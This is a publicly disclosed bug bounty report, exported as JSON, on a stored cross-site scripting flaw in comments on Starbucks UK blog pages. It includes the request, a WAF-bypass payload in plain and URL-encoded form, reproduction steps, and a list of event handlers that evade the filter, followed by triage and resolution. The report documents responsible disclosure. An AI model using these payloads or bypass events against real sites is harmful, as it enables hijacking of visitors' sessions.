{"id":218226,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTgyMjY=","url":"https://hackerone.com/reports/218226","title":"Stored XSS in comments on https://www.starbucks.co.uk/blog/*","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-04-02T23:18:08.913Z","submitted_at":"2017-04-02T23:18:08.913Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bayotop","url":"/bayotop","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-06-27T17:13:40.679Z","bug_reporter_agreed_on_going_public_at":"2017-06-26T20:24:19.057Z","team_member_agreed_on_going_public_at":"2017-06-27T17:13:40.600Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nthere are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork `site:www.starbucks.co.uk inurl:blog/`. Notice the comments functionality at the bottom at the page.\n\nWhen a comment is sent the following request is made:\n```http\nPOST /blog/addcomment HTTP/1.1\nHost: www.starbucks.co.uk\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nX-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\nContent-Length: 321\nCookie: [redacted]\nConnection: close\n\nBody=Nice\u0026ParentId=0\u0026PostID=1241\u0026author=ope67164%40disaq.com\n```\nThe values of the `Body` and `author` parameters will be rendered into the page as a new comment. The value from the `author` parameter is not correctly encoded. This allows to inject arbitrary valid HTML.\n\nYou seem to be using a WAF which will block request (500) containing `\u003cscript\u003e\u003c/script\u003e` and various input matching `on*=`.  However, I managed to find a bypass:\n\n```html\n\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003ctest/onbeforescriptexecute=confirm`h1poc`\u003e\n```\n\nThis will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\n\nNote that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).\n\nHere is a list of all potential `on*=` events I could find, that will bypass your WAF an can be used to create cross-browser payloads:\n\n```\nonsearch\nonwebkitanimationiteration\nonwebkitanimationstart\nonanimationiteration\nonwebkitanimationend\nonanimationstart\nondataavailable\nontransitionend\nonanimationend\nonreceived\nonpopstate\n```\n\nTo fix this issue make sure the `author` value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.\n\nPlease let me know in case you need any more information from my side. ","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-07-26T20:24:19.111Z","allow_singular_disclosure_after":-132860501.47057968,"singular_disclosure_allowed":true,"vote_count":19,"voters":["bogdantcaciuc","bl4de","spam404","s_p_q_r","bayotop","eveeez","r3y","quistertow","zuh4n","0xradi","and 9 more..."],"severity":{"rating":"high","score":7.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1579852,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @bayotop \n\n\nUnfortunately i was not able to reproduce your submission, could you please add additional information how to abuse this vulnerability?\n\nThanks!\n\n@rubikcube ","automated_response":false,"created_at":"2017-04-03T08:30:20.450Z","updated_at":"2017-04-03T08:30:20.450Z","actor":{"username":"rubikcube","cleared":false,"url":"/rubikcube","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/112/037/07ab876d3c8a79046085764c245ca1793dcf1d57_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1579882,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\n\nthis is the request I used to post the comment: \n\n```http\nPOST /blog/addcomment HTTP/1.1\nHost: www.starbucks.co.uk\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nX-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\nContent-Length: 321\nCookie: [redacted]\nConnection: close\n\nBody=Nice\u0026ParentId=0\u0026PostID=1241\u0026author=ope67164%40disaq.com%3c%2f%6c%69%3e%3c%2f%75%6c%3e%3c%2f%6c%69%3e%3c%2f%75%6c%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%74%65%73%74%2f%6f%6e%62%65%66%6f%72%65%73%63%72%69%70%74%65%78%65%63%75%74%65%3d%63%6f%6e%66%69%72%6d%60%68%31%70%6f%63%60%3e\n```\n\nNote that you need to be authenticated to post comments so you need to add valid cookies to the above request.\n\nThe exact steps to reproduce are:\n\n1. Go to any blog post (https://www.starbucks.co.uk/blog/*) with an enabled comment section.\n2. Post any comment and capture the request in a proxy (i.e. BurpSuite).\n3. Append the URL encoded payload to the `author` parameter value and forward the edited request.\n4. After reloading, the comment is added and anyone visiting the page will trigger the injected JS.\n\nNote that the above payload works only in FireFox. \n\nIf it still doesn't help, could you please specify where exactly is happening? Sharing the URL where you try to reproduce the issue would help too (if it is public of course). ","automated_response":false,"created_at":"2017-04-03T08:56:36.747Z","updated_at":"2017-04-03T09:02:47.701Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1580119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @bayotop \n\nAm i right you do need a valid account for the Starbucks blog? How would an attacker gain one? \n\nbest\n\n@rubikcube ","automated_response":false,"created_at":"2017-04-03T11:10:28.493Z","updated_at":"2017-04-03T11:10:28.493Z","actor":{"username":"rubikcube","cleared":false,"url":"/rubikcube","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/112/037/07ab876d3c8a79046085764c245ca1793dcf1d57_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1580144,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I used this link - https://www.starbucks.co.uk/account/signin - to create a test account. Once I was authenticated, I was free to post comments on https://www.starbucks.co.uk/blogs/*. See the comments at the bottom of this page -\n https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability.\n\nIf this is not intended behavior., then that would be a whole different issue on it's own. \n\nNonetheless, I would strongly recommend fixing the XSS issue described above. \"A valid account for the Starbucks blog is needed\" is a very dangerous presumption in this case. Totally legitimate accounts can be compromised in many different ways and then used to hijack other user's session by the XSS described above. Also you never know when legitimate users turn malicous. \n\nI am correct assuming you were now able to reproduce the issue?","automated_response":false,"created_at":"2017-04-03T11:23:52.531Z","updated_at":"2017-04-03T11:23:52.531Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1582777,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @bayotop \n\nI was able to confirm your submission, could you please remove the comments? \n\nThanks!\n\n@rubikcube ","automated_response":false,"created_at":"2017-04-04T13:03:27.959Z","updated_at":"2017-04-04T13:03:27.959Z","actor":{"username":"rubikcube","cleared":false,"url":"/rubikcube","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/112/037/07ab876d3c8a79046085764c245ca1793dcf1d57_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1582807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @rubikcube,\n\nI am happy to hear that. \n\nI'd love to remove the comments, but there seems to be no option for that. The only options I can see are `Reply`, `Flagged` and `Permalink`.","automated_response":false,"created_at":"2017-04-04T13:12:50.465Z","updated_at":"2017-04-04T13:13:06.829Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1604064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nJust wondering whether there has been any action or progress made on this report?\nThanks.","automated_response":false,"created_at":"2017-04-11T05:49:24.174Z","updated_at":"2017-04-11T05:49:24.174Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1607208,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @bayotop,\n\nThanks for the report \u0026 sorry for the delay here.  This issue is with our starbucks.com team and we'll be in touch as soon as we have another update.","automated_response":false,"created_at":"2017-04-12T14:35:21.458Z","updated_at":"2017-04-12T14:35:21.458Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1607210,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-04-12T14:35:57.946Z","updated_at":"2017-04-12T14:35:57.946Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Starbucks"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"bayotop","url":"/bayotop"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1639367,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @siren,\n\nGlad to hear that and thanks for the bounty. Let me know if I can be of any further assistance. ","automated_response":false,"created_at":"2017-04-27T08:14:51.958Z","updated_at":"2017-04-27T08:14:51.958Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1691899,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nSince it's been one month now, do you have any updates on when this issue will be resolved? Thanks.","automated_response":false,"created_at":"2017-05-22T15:49:25.835Z","updated_at":"2017-05-22T15:49:25.835Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1740584,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Seems like ```https://www.starbucks.*/blog/*``` permanently redirects to https://1912pike.com making this publicly unexploitable. Still, you should definitely fix the issue in case the blog functionality is accessible internally. \n\nAnyway, I am considering this issue resolved. ","automated_response":false,"created_at":"2017-06-08T07:06:33.739Z","updated_at":"2017-06-08T07:06:33.739Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1782421,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @bayotop,\n\nSorry for the delay in closing this out.\nAs you mentioned, the redirect was put in place resolving the issue while the functionality and code itself is being removed.\n\nThanks!\n","automated_response":false,"created_at":"2017-06-26T20:17:04.456Z","updated_at":"2017-06-26T20:17:04.456Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bayotop","url":"/bayotop"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1782439,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-06-26T20:24:19.079Z","updated_at":"2017-06-26T20:24:19.079Z","first_to_agree":true,"actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1785063,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-06-27T17:13:40.624Z","updated_at":"2017-06-27T17:13:40.624Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1785064,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-06-27T17:13:40.733Z","updated_at":"2017-06-27T17:13:40.733Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3063264,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-07-18T18:26:45.476Z","updated_at":"2018-07-18T18:26:45.476Z","additional_data":{"old_severity":null,"new_severity":"High (7.3)","old_severity_id":null,"new_severity_id":184671},"actor":{"username":"doggos","cleared":false,"url":"/doggos","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/277/976/e6a23fde0d47001c23dfed7d3c2fef3eb608463e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}